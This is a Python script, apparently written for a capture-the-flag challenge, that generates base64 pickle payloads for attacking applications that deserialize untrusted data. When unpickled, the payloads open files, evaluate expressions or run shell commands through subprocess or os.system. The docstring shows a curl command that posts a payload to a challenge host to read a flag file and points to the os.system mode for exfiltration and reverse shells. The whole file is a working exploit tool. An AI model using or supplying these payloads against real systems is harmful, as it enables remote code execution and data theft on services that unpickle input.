#!/usr/bin/env python3
"""Build a base64 Python-pickle payload.

    --read FILE    unpickles to open(FILE)            (app that reads/prints file-like objects)
    --cmd CMD      unpickles to subprocess.check_output(CMD, shell=True)  (returns bytes)
    --cmd CMD --system   os.system(CMD)               (return value only; use for exfil/revshell)
    --eval EXPR    unpickles to eval(EXPR)

    curl -s --data-urlencode "blob=$(python pickle_payload.py --read /flag/flag)" http://inj12.chal.deti:8051/restore
    python pickle_payload.py --cmd 'cat /flag/flag' --raw > p.pkl
"""
import argparse
import base64
import os
import pickle
import subprocess
import sys


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--read")
    g.add_argument("--cmd")
    g.add_argument("--eval")
    ap.add_argument("--system", action="store_true")
    ap.add_argument("--raw", action="store_true", help="write raw bytes to stdout")
    ap.add_argument("--protocol", type=int, default=2)
    a = ap.parse_args()

    class P:
        def __reduce__(self):
            if a.read:
                return (open, (a.read,))
            if a.eval:
                return (eval, (a.eval,))
            if a.system:
                return (os.system, (a.cmd,))
            return (subprocess.check_output, (["/bin/sh", "-c", a.cmd],))

    data = pickle.dumps(P(), protocol=a.protocol)
    if a.raw:
        sys.stdout.buffer.write(data)
    else:
        print(base64.b64encode(data).decode())


if __name__ == "__main__":
    main()
